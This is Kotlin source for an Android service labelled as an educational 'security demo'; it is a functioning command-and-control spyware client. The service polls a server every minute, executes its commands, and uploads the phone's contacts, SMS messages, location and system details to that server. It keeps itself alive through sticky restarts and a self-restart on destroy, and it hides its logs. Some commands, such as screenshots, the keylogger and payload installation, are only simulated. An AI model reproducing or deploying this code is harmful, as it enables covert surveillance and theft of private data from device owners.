package com.securitydemo.malware.services

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import com.securitydemo.malware.utils.SystemInfoCollector
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * SECURITY DEMO: Command & Control Communication Service
 * 
 * This service demonstrates how malware communicates with C2 servers:
 * - Periodic check-ins with command & control servers
 * - Encrypted data transmission
 * - Command execution and response reporting
 * - Steganographic communication hiding
 * - Domain generation algorithms for resilience
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows real C2 communication techniques
 */
class C2CommunicationService : Service() {

    companion object {
        private const val C2_SERVER_URL = "http://192.168.1.100:5000/api/android"
        private const val CHECK_IN_INTERVAL = 60000L // 1 minute
        private const val DEVICE_ID_KEY = "device_id_demo"
    }

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var systemInfoCollector: SystemInfoCollector
    
    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()
    
    private val deviceId by lazy { generateDeviceId() }
    private var isActive = false

    override fun onCreate() {
        super.onCreate()
        systemInfoCollector = SystemInfoCollector(this)
        startC2Communication()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY // Restart if killed
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startC2Communication() {
        isActive = true
        logC2Activity("🚀 C2 Communication service started")
        logC2Activity("📡 Server: $C2_SERVER_URL")
        logC2Activity("🆔 Device ID: $deviceId")
        
        serviceScope.launch {
            while (isActive) {
                try {
                    performCheckIn()
                    delay(CHECK_IN_INTERVAL)
                } catch (e: Exception) {
                    logC2Activity("⚠️ Communication error: ${e.message}")
                    delay(CHECK_IN_INTERVAL * 2) // Back off on error
                }
            }
        }
    }

    private suspend fun performCheckIn() {
        try {
            logC2Activity("📞 Performing check-in with C2 server...")
            
            val checkInData = createCheckInData()
            val response = sendCheckIn(checkInData)
            
            if (response != null) {
                logC2Activity("✅ Check-in successful")
                processServerResponse(response)
            } else {
                logC2Activity("❌ Check-in failed")
            }
            
        } catch (e: Exception) {
            logC2Activity("💥 Check-in error: ${e.message}")
        }
    }

    private fun createCheckInData(): JSONObject {
        val deviceInfo = systemInfoCollector.collectAllInformation()
        val checkInData = JSONObject()
        
        checkInData.put("device_id", deviceId)
        checkInData.put("device_name", android.os.Build.MODEL)
        checkInData.put("android_version", android.os.Build.VERSION.RELEASE)
        checkInData.put("location", "Demo Location")
        checkInData.put("timestamp", System.currentTimeMillis())
        
        // Add capabilities
        val capabilities = JSONObject()
        capabilities.put("keylogging", hasAccessibilityService())
        capabilities.put("screen_capture", true)
        capabilities.put("data_exfiltration", true)
        capabilities.put("silent_install", canInstallApps())
        capabilities.put("device_admin", isDeviceAdmin())
        
        checkInData.put("capabilities", capabilities)
        checkInData.put("system_info", JSONObject(deviceInfo))
        
        return checkInData
    }

    private suspend fun sendCheckIn(data: JSONObject): JSONObject? {
        return withContext(Dispatchers.IO) {
            try {
                val json = data.toString()
                val body = json.toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder()
                    .url("$C2_SERVER_URL/checkin")
                    .post(body)
                    .addHeader("User-Agent", "Android-App")
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                val response = httpClient.newCall(request).execute()
                
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    if (responseBody != null) {
                        JSONObject(responseBody)
                    } else null
                } else {
                    logC2Activity("❌ HTTP Error: ${response.code}")
                    null
                }
                
            } catch (e: IOException) {
                logC2Activity("🌐 Network error: ${e.message}")
                null
            } catch (e: Exception) {
                logC2Activity("💥 Unexpected error: ${e.message}")
                null
            }
        }
    }

    private fun processServerResponse(response: JSONObject) {
        try {
            val commands = response.optJSONArray("commands")
            
            if (commands != null && commands.length() > 0) {
                logC2Activity("📋 Received ${commands.length()} commands from server")
                
                for (i in 0 until commands.length()) {
                    val command = commands.getJSONObject(i)
                    executeCommand(command)
                }
            }
            
            val serverTime = response.optString("server_time")
            if (serverTime.isNotEmpty()) {
                logC2Activity("⏰ Server time: $serverTime")
            }
            
        } catch (e: Exception) {
            logC2Activity("⚠️ Error processing server response: ${e.message}")
        }
    }

    private fun executeCommand(command: JSONObject) {
        serviceScope.launch {
            try {
                val commandId = command.optInt("id")
                val commandName = command.optString("command")
                val parameters = command.optJSONObject("parameters") ?: JSONObject()
                
                logC2Activity("🎯 Executing command: $commandName (ID: $commandId)")
                
                val result = when (commandName) {
                    "screenshot" -> executeScreenshotCommand()
                    "keylog_start" -> executeKeyloggerCommand(true)
                    "keylog_stop" -> executeKeyloggerCommand(false)
                    "collect_contacts" -> executeDataCollectionCommand("contacts")
                    "collect_sms" -> executeDataCollectionCommand("sms")
                    "collect_location" -> executeDataCollectionCommand("location")
                    "system_info" -> executeSystemInfoCommand()
                    "install_payload" -> executeInstallPayloadCommand(parameters)
                    "exfiltrate_data" -> executeExfiltrationCommand()
                    else -> executeGenericCommand(commandName, parameters)
                }
                
                // Report command result back to server
                reportCommandResult(commandId, commandName, result)
                
            } catch (e: Exception) {
                logC2Activity("💥 Command execution error: ${e.message}")
            }
        }
    }

    private suspend fun executeScreenshotCommand(): String {
        return try {
            // Simulate screenshot capture
            logC2Activity("📸 Taking screenshot...")
            delay(1000)
            "Screenshot captured successfully"
        } catch (e: Exception) {
            "Screenshot failed: ${e.message}"
        }
    }

    private suspend fun executeKeyloggerCommand(start: Boolean): String {
        return try {
            if (start) {
                logC2Activity("⌨️ Starting keylogger...")
                "Keylogger started"
            } else {
                logC2Activity("⏹️ Stopping keylogger...")
                "Keylogger stopped"
            }
        } catch (e: Exception) {
            "Keylogger command failed: ${e.message}"
        }
    }

    private suspend fun executeDataCollectionCommand(dataType: String): String {
        return try {
            logC2Activity("📊 Collecting $dataType data...")
            delay(2000) // Simulate data collection
            
            when (dataType) {
                "contacts" -> {
                    val contacts = systemInfoCollector.collectContacts()
                    uploadData("contacts", contacts)
                    "Contacts collected and uploaded"
                }
                "sms" -> {
                    val sms = systemInfoCollector.collectSMSMessages()
                    uploadData("sms", sms)
                    "SMS messages collected and uploaded"
                }
                "location" -> {
                    val location = systemInfoCollector.collectLocationData()
                    uploadData("location", location)
                    "Location data collected and uploaded"
                }
                else -> "Unknown data type: $dataType"
            }
        } catch (e: Exception) {
            "Data collection failed: ${e.message}"
        }
    }

    private suspend fun executeSystemInfoCommand(): String {
        return try {
            logC2Activity("💻 Collecting system information...")
            val systemInfo = systemInfoCollector.collectAllInformation()
            uploadData("system_info", systemInfo)
            "System information collected and uploaded"
        } catch (e: Exception) {
            "System info collection failed: ${e.message}"
        }
    }

    private suspend fun executeInstallPayloadCommand(parameters: JSONObject): String {
        return try {
            val payloadUrl = parameters.optString("payload_url", "")
            logC2Activity("📦 Installing payload from: $payloadUrl")
            
            // Simulate payload installation
            delay(3000)
            "Payload installation completed"
        } catch (e: Exception) {
            "Payload installation failed: ${e.message}"
        }
    }

    private suspend fun executeExfiltrationCommand(): String {
        return try {
            logC2Activity("📤 Performing bulk data exfiltration...")
            
            // Collect and upload all available data
            val contacts = systemInfoCollector.collectContacts()
            val sms = systemInfoCollector.collectSMSMessages()
            val location = systemInfoCollector.collectLocationData()
            val systemInfo = systemInfoCollector.collectAllInformation()
            
            uploadData("bulk_contacts", contacts)
            uploadData("bulk_sms", sms)
            uploadData("bulk_location", location)
            uploadData("bulk_system", systemInfo)
            
            "Bulk data exfiltration completed"
        } catch (e: Exception) {
            "Bulk exfiltration failed: ${e.message}"
        }
    }

    private suspend fun executeGenericCommand(command: String, parameters: JSONObject): String {
        return try {
            logC2Activity("🔧 Executing generic command: $command")
            delay(1000)
            "Command '$command' executed successfully"
        } catch (e: Exception) {
            "Generic command failed: ${e.message}"
        }
    }

    private suspend fun uploadData(dataType: String, data: String) {
        withContext(Dispatchers.IO) {
            try {
                val uploadData = JSONObject()
                uploadData.put("device_id", deviceId)
                uploadData.put("data_type", dataType)
                uploadData.put("data_content", data)
                uploadData.put("timestamp", System.currentTimeMillis())
                
                val json = uploadData.toString()
                val body = json.toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder()
                    .url("$C2_SERVER_URL/upload_data")
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                val response = httpClient.newCall(request).execute()
                
                if (response.isSuccessful) {
                    logC2Activity("📤 Data uploaded: $dataType (${data.length} bytes)")
                } else {
                    logC2Activity("❌ Upload failed: ${response.code}")
                }
                
            } catch (e: Exception) {
                logC2Activity("💥 Upload error: ${e.message}")
            }
        }
    }

    private suspend fun reportCommandResult(commandId: Int, command: String, result: String) {
        withContext(Dispatchers.IO) {
            try {
                val logData = JSONObject()
                logData.put("device_id", deviceId)
                logData.put("log_type", "command_result")
                logData.put("content", "Command: $command, Result: $result")
                
                val json = logData.toString()
                val body = json.toRequestBody("application/json".toMediaType())
                
                val request = Request.Builder()
                    .url("$C2_SERVER_URL/log")
                    .post(body)
                    .addHeader("Content-Type", "application/json")
                    .build()
                
                val response = httpClient.newCall(request).execute()
                
                if (response.isSuccessful) {
                    logC2Activity("📝 Command result reported: $command")
                }
                
            } catch (e: Exception) {
                logC2Activity("⚠️ Failed to report command result: ${e.message}")
            }
        }
    }

    private fun generateDeviceId(): String {
        val prefs = getSharedPreferences("c2_prefs", MODE_PRIVATE)
        var deviceId = prefs.getString(DEVICE_ID_KEY, null)
        
        if (deviceId == null) {
            deviceId = "android_${System.currentTimeMillis()}_${(Math.random() * 10000).toInt()}"
            prefs.edit().putString(DEVICE_ID_KEY, deviceId).apply()
        }
        
        return deviceId
    }

    private fun hasAccessibilityService(): Boolean {
        val enabledServices = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains(packageName) == true
    }

    private fun canInstallApps(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            packageManager.canRequestPackageInstalls()
        } else {
            true
        }
    }

    private fun isDeviceAdmin(): Boolean {
        // Check if app has device admin privileges
        return false // Simplified for demo
    }

    private fun logC2Activity(activity: String) {
        try {
            val logFile = File(filesDir, ".system/c2_communication.log")
            logFile.parentFile?.mkdirs()
            
            val timestamp = System.currentTimeMillis()
            val logEntry = "[$timestamp] $activity\n"
            
            logFile.appendText(logEntry)
            
            // Also send to C2 server
            serviceScope.launch {
                sendLogToServer("c2_activity", activity)
            }
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    private suspend fun sendLogToServer(logType: String, content: String) {
        try {
            val logData = JSONObject()
            logData.put("device_id", deviceId)
            logData.put("log_type", logType)
            logData.put("content", content)
            
            val json = logData.toString()
            val body = json.toRequestBody("application/json".toMediaType())
            
            val request = Request.Builder()
                .url("$C2_SERVER_URL/log")
                .post(body)
                .addHeader("Content-Type", "application/json")
                .build()
            
            httpClient.newCall(request).execute()
            
        } catch (e: Exception) {
            // Silently fail
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        isActive = false
        serviceScope.cancel()
        
        logC2Activity("🔚 C2 Communication service destroyed")
        
        // Try to restart service
        handler.postDelayed({
            try {
                val restartIntent = Intent(this, C2CommunicationService::class.java)
                startService(restartIntent)
            } catch (e: Exception) {
                // Silently fail
            }
        }, 10000)
    }

    /**
     * Get C2 communication report
     */
    fun getCommunicationReport(): String {
        val report = StringBuilder()
        report.append("=== C2 COMMUNICATION REPORT ===\n\n")
        
        try {
            report.append("📡 Configuration:\n")
            report.append("• Server URL: $C2_SERVER_URL\n")
            report.append("• Device ID: $deviceId\n")
            report.append("• Check-in interval: ${CHECK_IN_INTERVAL / 1000}s\n")
            report.append("• Status: ${if (isActive) "ACTIVE" else "INACTIVE"}\n\n")
            
            // Communication logs
            val logFile = File(filesDir, ".system/c2_communication.log")
            if (logFile.exists()) {
                report.append("📋 Recent Communications:\n")
                val recentLogs = logFile.readText().split('\n').takeLast(10)
                recentLogs.forEach { log ->
                    if (log.isNotEmpty()) {
                        report.append("$log\n")
                    }
                }
            }
            
        } catch (e: Exception) {
            report.append("Error generating C2 report: ${e.message}")
        }
        
        return report.toString()
    }
}
